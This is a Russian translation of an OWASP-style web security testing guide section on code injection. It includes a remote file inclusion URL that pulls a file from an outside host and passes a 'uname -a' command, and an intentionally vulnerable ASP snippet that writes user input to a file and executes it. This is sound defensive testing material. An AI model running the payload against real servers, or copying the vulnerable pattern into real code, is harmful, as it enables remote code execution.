# Внедрение кода

| ID |
| --- |
| WSTG-INJT-11 |

## Резюме

В данном разделе рассматривается методика тестирования возможности передачи программного кода в качестве входных данных веб-страницы с целью его последующего выполнения на веб-сервере.

При тестировании на внедрение кода (Code Injection) специалист передает входные данные, которые обрабатываются веб-сервером в качестве динамического исполняемого кода или включаемого файла. Данные тесты применимы к различным серверным интерпретаторам скриптов, например ASP или PHP. Для защиты от подобных атак необходимы корректная валидация входных данных и применение практик безопасной разработки.

## Цели тестирования

- Идентифицировать точки внедрения, через которые возможно передать код в приложение.
- Оценить уровень критичности уязвимости внедрения кода.

## Методика тестирования

### Тестирование методом «черного ящика»

#### Уязвимости PHP-инъекций

Используя строку запроса (querystring), тестировщик может внедрить код (в данном примере — вредоносный URL), который будет обработан интерпретатором в рамках подключаемого файла:

`https://www.example.com/uptime.php?pin=https://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a`

> Вредоносный URL принимается в качестве параметра PHP-страницы, которая затем использует переданное значение в подключаемом файле.

### Тестирование методом «серого ящика»

#### Уязвимости внедрения кода ASP

Изучите исходный код ASP на предмет передачи пользовательского ввода в функции исполнения кода. Может ли пользователь передать команды в поле ввода Data? В данном примере код ASP сохраняет переданный ввод в файл, а затем исполняет его:

```asp
<%
If not isEmpty(Request( "Data" ) ) Then
Dim fso, f
'User input Data is written to a file named data.txt
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.OpenTextFile(Server.MapPath( "data.txt" ), 8, True)
f.Write Request("Data") & vbCrLf
f.close
Set f = nothing
Set fso = Nothing

'Data.txt is executed
Server.Execute( "data.txt" )

Else
%>

<form>
<input name="Data" /><input type="submit" name="Enter Data" />

</form>
<%
End If
%>)))
```
